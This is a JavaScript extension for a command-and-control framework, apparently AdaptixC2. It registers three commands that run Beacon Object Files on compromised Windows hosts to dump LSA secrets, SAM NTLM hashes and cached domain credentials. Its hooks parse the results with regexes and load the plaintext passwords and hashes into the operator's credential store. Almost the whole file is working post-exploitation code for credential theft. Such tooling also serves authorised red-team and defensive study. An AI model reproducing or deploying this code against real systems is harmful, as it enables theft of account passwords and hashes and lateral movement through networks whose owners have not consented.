var metadata = {
    name: "LSAdump-BOF",
    description: "BOF tools for dumping LSA secrets, SAM hashes, and cached domain credentials"
};

/// COMMANDS

var cmd_lsadump_secrets = ax.create_command("lsadump_secrets", "Dump LSA secrets from SECURITY hive (requires SYSTEM)", "lsadump_secrets");
cmd_lsadump_secrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let accumulatedText = "";
    let processedSecrets = new Set();
    
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        if (task.text) {
            accumulatedText += task.text;
        }
        
        // Match service secrets with format:
        // Secret  : _SC_<ServiceName>
        //  / service '<ServiceName>' with username : <username>
        // cur/text: <password>
        // or
        // old/text: <password>
        let fullText = accumulatedText;
        let lines = fullText.split(/\r?\n/);
        
        let currentSecret = null;
        let currentService = null;
        let currentUsername = null;
        let secretsFound = 0;
        let credentialsAdded = 0;
        
        for (let i = 0; i < lines.length; i++) {
            let line = lines[i];
            
            let secretMatch = line.match(/Secret\s+:\s+_SC_(.+)/);
            if (secretMatch) {
                secretsFound++;
                let secretName = secretMatch[1].trim();
                
                if (currentSecret && currentService && currentUsername) {
                    for (let j = currentSecret.lineIndex + 1; j < lines.length; j++) {
                        let pwdLine = lines[j];
                        
                        if (pwdLine.match(/Secret\s+:/)) break;
                        
                        let curMatch = pwdLine.match(/cur\/text:\s+(.+)/);
                        if (curMatch) {
                            let password = curMatch[1].trim();
                            if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                                let domain = "";
                                let user = currentUsername;
                                if (currentUsername.includes("\\")) {
                                    let parts = currentUsername.split("\\");
                                    domain = parts[0];
                                    user = parts.slice(1).join("\\");
                                }
                                let credKey = `${currentService}:${user}:${password}:cur`;
                                if (!processedSecrets.has(credKey)) {
                                    processedSecrets.add(credKey);
                                    let tag = domain ? `${domain} / ${currentService}` : currentService;
                                    ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret", `${computer} (${address})`);
                                    credentialsAdded++;
                                }
                            }
                        }
                        
                        let oldMatch = pwdLine.match(/old\/text:\s+(.+)/);
                        if (oldMatch) {
                            let password = oldMatch[1].trim();
                            if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                                let domain = "";
                                let user = currentUsername;
                                if (currentUsername.includes("\\")) {
                                    let parts = currentUsername.split("\\");
                                    domain = parts[0];
                                    user = parts.slice(1).join("\\");
                                }
                                let credKey = `${currentService}:${user}:${password}:old`;
                                if (!processedSecrets.has(credKey)) {
                                    processedSecrets.add(credKey);
                                    let tag = domain ? `${domain} / ${currentService}` : currentService;
                                    ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret (old)", `${computer} (${address})`);
                                    credentialsAdded++;
                                }
                            }
                        }
                    }
                }
                
                currentSecret = {name: secretName, lineIndex: i};
                currentService = null;
                currentUsername = null;
                continue;
            }
            
            if (currentSecret) {
                let serviceMatch = line.match(/service\s+'([^']+)'\s+with\s+username\s+:\s+(.+)/);
                if (serviceMatch) {
                    currentService = serviceMatch[1];
                    currentUsername = serviceMatch[2].trim();
                }
            }
        }
        
        if (currentSecret && currentService && currentUsername) {
            for (let j = currentSecret.lineIndex + 1; j < lines.length; j++) {
                let pwdLine = lines[j];
                
                if (pwdLine.match(/Secret\s+:/)) break;
                
                let curMatch = pwdLine.match(/cur\/text:\s+(.+)/);
                if (curMatch) {
                    let password = curMatch[1].trim();
                    if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                        let domain = "";
                        let user = currentUsername;
                        if (currentUsername.includes("\\")) {
                            let parts = currentUsername.split("\\");
                            domain = parts[0];
                            user = parts.slice(1).join("\\");
                        }
                        let credKey = `${currentService}:${user}:${password}:cur`;
                        if (!processedSecrets.has(credKey)) {
                            processedSecrets.add(credKey);
                            let tag = domain ? `${domain} / ${currentService}` : currentService;
                            ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret", `${computer} (${address})`);
                            credentialsAdded++;
                        }
                    }
                }
                
                let oldMatch = pwdLine.match(/old\/text:\s+(.+)/);
                if (oldMatch) {
                    let password = oldMatch[1].trim();
                    if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                        let domain = "";
                        let user = currentUsername;
                        if (currentUsername.includes("\\")) {
                            let parts = currentUsername.split("\\");
                            domain = parts[0];
                            user = parts.slice(1).join("\\");
                        }
                        let credKey = `${currentService}:${user}:${password}:old`;
                        if (!processedSecrets.has(credKey)) {
                            processedSecrets.add(credKey);
                            let tag = domain ? `${domain} / ${currentService}` : currentService;
                            ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret (old)", `${computer} (${address})`);
                            credentialsAdded++;
                        }
                    }
                }
            }
        }
        
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_secrets." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::secrets", hook);
});


var cmd_lsadump_sam = ax.create_command("lsadump_sam", "Dump SAM hashes (requires admin)", "lsadump_sam");
cmd_lsadump_sam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        let regex = /^([a-zA-Z0-9_\-]+):(\d+):([a-fA-F0-9]{32})$/gm;
        while ((match = regex.exec(task.text)) !== null) {
            ax.credentials_add(match[1], match[3], "", "ntlm", "", "SAM", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_sam." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::sam", hook);
});


var cmd_lsadump_cache = ax.create_command("lsadump_cache", "Dump cached domain credentials (DCC2/MSCacheV2, requires SYSTEM)", "lsadump_cache");
cmd_lsadump_cache.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        // Match: MsCacheV2 : <hash>
        let regex = /User\s+:\s+([^\\\n]+)\\([^\n]+)\nMsCacheV2\s+:\s+([a-fA-F0-9]{32})/gm;
        while ((match = regex.exec(task.text)) !== null) {
            let domain = match[1];
            let username = match[2];
            let hash = match[3];
            ax.credentials_add(username, hash, "", "dcc2", domain, "DCC2", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_cache." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::cache", hook);
});



var group_lsadump = ax.create_commands_group("LSAdump-BOF", [
    cmd_lsadump_secrets, cmd_lsadump_sam, cmd_lsadump_cache
]);
ax.register_commands_group(group_lsadump, ["beacon", "gopher"], ["windows"], []);
